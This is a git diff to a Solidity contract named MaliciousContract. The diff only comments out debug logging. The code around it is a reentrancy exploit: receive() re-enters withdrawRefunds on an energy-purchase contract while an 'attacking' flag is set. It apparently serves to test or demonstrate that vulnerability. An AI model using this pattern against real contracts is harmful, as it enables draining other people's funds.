@@ -20,10 +20,10 @@ contract MaliciousContract {
     }
 
     function commitPurchase(bytes32 _commitmentHash) external {
-        console.log(
-            "Committing purchase with hash:",
-            bytes32ToString(_commitmentHash)
-        );
+        // console.log(
+        //     "Committing purchase with hash:",
+        //     bytes32ToString(_commitmentHash)
+        // );
         energyContract.commitPurchase(_commitmentHash);
     }
 
@@ -31,27 +31,27 @@ contract MaliciousContract {
         uint256 _kWh,
         uint256 _nonce
     ) external payable {
-        console.log(
-            "attackRevealPurchase called with kWh: %d, nonce: %d, value: %d",
-            _kWh,
-            _nonce,
-            msg.value
-        );
+        // console.log(
+        //     "attackRevealPurchase called with kWh: %d, nonce: %d, value: %d",
+        //     _kWh,
+        //     _nonce,
+        //     msg.value
+        // );
         attacking = true;
         energyContract.revealPurchase{value: msg.value}(_kWh, _nonce);
     }
 
     function attackWithdrawRefunds() external {
-        console.log("attackWithdrawRefunds called by:", msg.sender);
+        //console.log("attackWithdrawRefunds called by:", msg.sender);
         attacking = true;
         energyContract.withdrawRefunds();
     }
 
 
     receive() external payable {
-        console.log("Receive called with value:", msg.value);
+        //console.log("Receive called with value:", msg.value);
         if (attacking) {
-            console.log("Attempting reentrancy on withdrawRefunds");
+            //console.log("Attempting reentrancy on withdrawRefunds");
             energyContract.withdrawRefunds();
         }
     }
